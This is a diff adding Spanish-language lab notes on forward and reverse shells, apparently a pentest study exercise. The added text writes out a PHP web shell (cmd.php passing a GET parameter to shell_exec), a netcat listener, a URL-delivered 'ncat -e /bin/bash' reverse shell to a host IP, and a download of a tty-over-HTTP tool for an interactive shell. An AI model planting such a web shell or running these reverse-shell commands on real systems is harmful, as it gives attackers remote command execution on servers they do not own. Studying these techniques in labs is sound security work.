@@ -86,12 +86,64 @@ iptables -A INPUT -p tcp --dport 0:65535 -m conntrack --ctstate NEW -j DROP
 /var/www/html/
 ```
 - Instalamos nano
-```
+```bin/bash
 apt install nano
 ```
 - Creamos un archivo en la interfaz dinamica
 ```
 nano cmd.php
+```
+```php
+<?
+	echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
+?>
+```
+- Abrimos este archivo para reparar el problema php en la pagina
+```
+nano /etc/php/8.1/apache2/php.ini
+```
+-----
+
+(Ctrl+w) = nos permite filtrar la linea `short_open_tag`
+Cambiar el Off por el On
+Cerramos y actualizamos la pagina web localhosts
+Y listo tenemos ejecución por consola a través de `localhost/cmd.php?cmd=whoami` a través de la URL
+
+-------
+- Instalamos ncat
+```
+apt install ncat
+```
+- Nos ponemos en escucha en el puerto 443
+```
+nc -nlvp 443
+```
+- Nos conectamos desde la **URL**
+```
+localhost/cmd.php?cmd=ncat -e /bin/bash 172.17.0.1 443
+```
+- Si no funciona podemos intentar trabajar con la libreria `ttyoverhttp.py` copiando el raw 
+```
+wget https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py
+```
+Modificamos todos los index.php a cmd.php
+- Actualizamos el archivo cmd.php 
+```php
+<?php
+	echo shell_exec($_GET['cmd']);
+?>
+```
+- Nos conectamos a la escucha de nuevo por 
+```
+nc -nlvp 443
+```
+- O tambien nos podemos conectar por 
+```python
+python tty_over_http.py
+```
+- Para conseguir una consola interactiva
+```
+script /dev/null -c bash
 ```
 
 ![[Ejemplo de ForwardShells.png]]
